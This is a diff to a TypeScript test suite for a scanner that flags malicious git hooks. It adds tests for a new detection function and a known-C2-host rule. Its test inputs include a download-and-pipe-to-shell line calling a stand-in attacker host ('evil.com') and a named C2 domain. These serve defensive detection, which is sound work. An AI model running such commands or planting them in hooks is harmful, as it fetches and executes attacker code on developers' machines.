@@ -8,6 +8,7 @@ import * as os from 'os';
 import * as path from 'path';
 import {
   collectScanTargets,
+  isMaliciousGitHookContent,
   matchHookFile,
   parseCoreHooksPath,
   scanWorkspaceRoot,
@@ -50,6 +51,21 @@ suite('HookScanner Tests', () => {
       expect(match).to.be.null;
     });
 
+    test('should NOT flag curl-only hook without pipe-to-shell', () => {
+      const filePath = path.join(workspaceRoot, '.husky', 'pre-commit');
+      const match = matchHookFile(filePath, 'curl -s https://example.com/docs/readme.md');
+
+      expect(match).to.be.null;
+    });
+
+    test('should detect known C2 host without pipe-to-shell', () => {
+      const filePath = path.join(workspaceRoot, '.husky', 'pre-commit');
+      const match = matchHookFile(filePath, 'echo precommit.vercel.app');
+
+      expect(match).to.exist;
+      expect(match!.rule.name).to.equal('Malicious Git Hooks Write');
+    });
+
     test('should detect .githooks hooksPath in .git/config', () => {
       const filePath = path.join(workspaceRoot, '.git', 'config');
       const content = '[core]\n\thooksPath = .githooks\n';
@@ -64,6 +80,24 @@ suite('HookScanner Tests', () => {
       const match = matchHookFile(filePath, '[core]\n\thooksPath = .husky/_\n');
 
       expect(match).to.be.null;
+    });
+  });
+
+  suite('isMaliciousGitHookContent', () => {
+    test('should match downloader plus pipe-to-shell', () => {
+      expect(isMaliciousGitHookContent("wget -qO- 'https://evil.com/x' | sh")).to.be.true;
+    });
+
+    test('should match known C2 host alone', () => {
+      expect(isMaliciousGitHookContent('https://precommit.vercel.app/settings/linux')).to.be.true;
+    });
+
+    test('should not match downloader without pipe', () => {
+      expect(isMaliciousGitHookContent('curl -s https://example.com')).to.be.false;
+    });
+
+    test('should not match benign lint-staged', () => {
+      expect(isMaliciousGitHookContent('npx lint-staged')).to.be.false;
     });
   });
 
